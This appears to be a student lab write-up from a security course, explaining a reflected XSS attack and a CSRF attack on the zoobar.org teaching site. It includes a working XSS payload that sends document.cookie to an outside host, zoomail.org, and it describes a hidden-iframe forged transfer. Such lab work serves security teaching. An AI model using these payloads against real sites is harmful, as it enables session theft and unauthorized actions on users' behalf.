[Attack A]
In this attack, we are taking advantage of the fact that the users.php script on
the zoobar.org website echoes elements of the query string directly to the page.
Effectively, whatever we supply as the user parameter will be inserted directly
into the page as a result of this code:

      9  <input type="text" name="user" value="<?php
     10    echo stripslashes($_GET['user']);
     11  ?>" size=10>

What we do then, is supply a string that causes the input element to be closed,
followed by a script tag containing our malicious script, which exploits src
attribute of the Image object to steal the cookies and then redirects the page
to the basic url for the users.php page to avoid the user noticing us changing
anything.
[Pretty version of payload]
" size=10> 
<script> 
var sploitvar = new Image().src=
    'http://zoomail.org/sendmail.php?' + 
    '&netid=cse127fai' + 
    '&payload=' + document.cookie +
    '&random=' +  Math.random();
top.location ="http://zoobar.org/users.php";
</script> 
<input type="text" style="display:none;


[Attack B]

b.html:
Objective and Vulnerability:
The objective for part B of this project is to use a cross-site request forgery attack to submit a request on the behalf of the user that he/she is unaware that he/she made.  This is do-able because the website uses only the cookie as authentication information.  If the user has already logged into the website zoobar.org, then the website will have set a cookie such that the browser now sends that cookie with every appropriate request.  This means that any request to zoobar.org will likely contain this cookie as authentication information.  The separation of origins using scheme, domain and port number means tha if we can send a request to the appropriate origin, we can send requests with that cookie, and thus, make requests on behalf of that user.

Exploit:
To get the site zoobar.org to recognize us as the appropriate user, due to authentication by cookie, we need to ensure that the browser sends the cookie to zoobar.org.  We could originally do this with a simple html <form> which would post to zoobar.org/transfer.php the values we give it for zoobars, recipient and submission, but this would then redirect the browser to the transfer.php page.  To get around this, we've loaded an <iframe> with zoobar.org/transfers.php inside of it.  For extra sneakiness, we've made this entire frame "hidden" using the style characteristic.  We've also generated a form on our page with the target being the hidden <iframe> we have introduced.  Because this <iframe> is for all intents and purposes, the same as zoobar.org/transfer.php, the browser sends the user's cookie along with the submission.  This authenticates the user and allows the requested transfer to go through.  In fact, the only difference between this and doing it on zoobar.org, is the referrer header, which is not checked on this site.  As soon as we have "clicked" the submit button, we then redirect the page to the cse127 website as directed, so that the user is unaware that any sneaky-business may have unfolded.  

Constants:
Our choice of constants for this exploit were simply those given to us: that the user should be "attacker" and that the number of zoobars should be 10.
